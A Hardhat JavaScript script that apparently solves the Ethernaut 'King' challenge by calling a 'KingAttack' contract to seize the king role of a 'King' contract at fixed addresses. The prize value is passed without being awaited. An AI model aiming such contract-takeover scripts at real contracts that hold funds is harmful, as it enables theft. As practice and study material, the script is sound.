// 0x7f79d43Cc91ABea470efe8a35b083E83E397fa01 --> KingAttack
// 0xd4bFc0c824df4D4c7f2b9c52b8ca5cDBc4785e51 --> King

const hre = require("hardhat");

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0xd4bFc0c824df4D4c7f2b9c52b8ca5cDBc4785e51"
  );

  const attackContractAddress = hre.ethers.utils.getAddress(
    "0xb98318aB49A4fAb2d4DBeCaADC81165ACdCB59dd"
  );

  const Contract = await hre.ethers.getContractFactory("King");
  const contractInstance = Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  const AttackContract = await hre.ethers.getContractFactory("KingAttack");
  const attackContractInstance = AttackContract.attach(attackContractAddress);

  const prize = contractInstance.prize();

  console.log("contract king before", await contractInstance._king());
  await attackContractInstance.attack(prize);

  console.log("contract king after", await contractInstance._king());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
